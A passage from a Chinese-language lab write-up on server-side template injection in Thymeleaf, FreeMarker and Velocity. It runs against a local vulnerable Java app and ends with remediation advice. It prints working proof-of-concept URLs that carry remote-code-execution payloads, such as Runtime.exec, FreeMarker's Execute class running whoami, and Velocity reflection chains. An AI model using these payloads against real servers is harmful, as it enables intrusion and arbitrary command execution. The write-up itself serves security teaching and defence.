http://127.0.0.1:8888/vulnapi/SSTI/thymeleaf/vul?lang=__${T(java.lang.Runtime).getRuntime().exec(%27calc.exe%27)}__::.x
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758162950057-d04aedc4-6024-4de8-9732-64177aa7d10d.png)

2. Thymeleaf模板片段参数可控

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758163008660-c41596b9-28ba-4bcd-b529-95823490ace9.png)

PoC：

```plain
http://127.0.0.1:8888/vulnapi/SSTI/thymeleaf/fragment/vul?section=__${T(java.lang.Runtime).getRuntime().exec(%27calc.exe%27)}__
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758163152394-58c92fb3-5037-4c18-a309-17dd869f060a.png)

3. url作为视图名

根据spring boot定义，如果controller无返回值，则以GetMapping的路由为视图名称，即将请求的url作为视图名称，调用模板引擎去解析，在这种情况下，我们只要可以控制请求的controller的参数，一样可以造成RCE漏洞

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758163510088-f3c7b458-25c0-4c82-b68b-3ad69ca0b213.png)

PoC：

```plain
http://127.0.0.1:8888/vulnapi/SSTI/doc/vul/__$%7BT(java.lang.Runtime).getRuntime().exec('calc.exe')%7D__
```

这条请求会让服务器在日志中记录如下一行：`[vul] SSTI payload: __${T(java.lang.Runtime).getRuntime().exec('calc.exe')}__`。如果日志查看页面使用Thymeleaf渲染，并且日志内容被直接放入模板（例如 `<div th:utext="${logEntry.message}">`），当管理员查看日志时，如果日志查看界面存在SSTI，这条日志中的表达式就会被执行。

4. FreeMaker模板注入

模板文件的内容是可控的，而且显式设置了`TemplateClassResolver.UNRESTRICTED_RESOLVER`。这是最致命的配置，它允许模板调用任意Java类的静态方法和构造方法。

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758164246556-078f3f7a-e136-48a5-925a-474cf56c897c.png)

PoC：

```plain
http://127.0.0.1:8888/vulnapi/SSTI/freemarker/vul?file=indexxx.ftl&content=%3C%23assign%20ex%3d%22freemarker%2etemplate%2eutility%2eExecute%22%3fnew%28%29%3E%20%24%7b%20ex%28%22whoami%22%29%20%7d
```

URL解码后是：

```plain
http://127.0.0.1:8888/vulnapi/SSTI/freemarker/vul?file=indexxx.ftl&content=<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("whoami") }
```

`<#assign ex="freemarker.template.utility.Execute"?new()>`作用是创建一个新的变量，并将其存储在一个名为 ex 的变量中，`${ ex("whoami") }`是FreeMarker的插值语法，模板引擎会计算花括号`{}`中的表达式，并将结果输出到最终渲染的文本中。

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758165113057-b3808ff8-bbde-4e48-ab7d-f7bb584e1e6e.png)

5. Velocity模板注入（evaluate场景）

`Velocity.evaluate()`方法会动态地解析并执行传入的模板字符串。Velocity不像FreeMarker那样直接内置命令执行函数，但可以通过反射来访问任意Java对象和方法，这是实现RCE的关键。

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758165836152-dac3ff27-d027-4bb7-ae04-d7843d76319d.png)

PoC：

```plain
http://127.0.0.1:8888/vulnapi/SSTI/velocity/evaluate/http://127.0.0.1:8888/vulnapi/SSTI/velocity/evaluate/vul?username=World%23set($phone=%22HACKED%22)
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758166171001-7258b51e-31d3-4cd9-9873-2ff2c248c338.png)

6. Velocity模板注入（merge场景）

这个漏洞点在于`templateString = templateString.replace("<USERNAME>", username); `这一行，代码从一个固定的模板文件`merge.vm`中读取内容，然后使用`String.replace()`将模板中的`<USERNAME>`这个字符串字面量直接替换为用户输入的`username`。最后，将这个已经被替换过的模板字符串解析并渲染，如果攻击者控制的`username`参数中包含了Velocity模板语法（如`$`, `#`），这些语法会在最终的模板渲染阶段被Velocity引擎解析执行。

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758166558512-aa02f7d9-db13-4125-a9c6-f3604845acb6.png)

PoC：

```plain
http://127.0.0.1:8888/vulnapi/SSTI/velocity/merge/vul?username=%23set(%24e%3D%22e%22)%24e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22%2Cnull).invoke(null%2Cnull).exec(%27calc.exe%27)
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758167957031-ba757981-78bd-4384-9ea7-f374c780422e.png)

这里对原有代码进行了改动，因为原代码会出现路径解析报错，直接通过文件路径读取模板文件，修改后的代码使用`ClassLoader.getResourceAsStream()`从类路径加载模板文件，避免了路径解析问题。

### 修改意见
1. 白名单限制模板参数

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758176391624-1d98f406-b750-47cd-8ad3-ac32c36e1137.png)

2. `controller`的参数设置为`HttpServletResponse`

Spring认为它已经处理了HTTP Response，因此不会发生视图名称解析

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758176488252-ad939ad9-d429-4948-b45f-416288bd593a.png)

3. 设置`@ResponseBody`注解

由于设置`@ResponseBody`注解告诉Spring将返回值作为响应体处理，而不再是视图名称，因此无法进行模板注入攻击

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758176573148-7129b214-cf36-4454-8a63-b16d59d78c2b.png)

4. 使用安全的解析器

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758176666829-54b289de-48fb-41aa-8440-eb0df718b372.png)

5. 将参数作为数据传递给模板，而不是直接拼接到模板字符串中

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758176942811-15b00164-865a-4073-8eed-b9cfbef1b9ec.png)



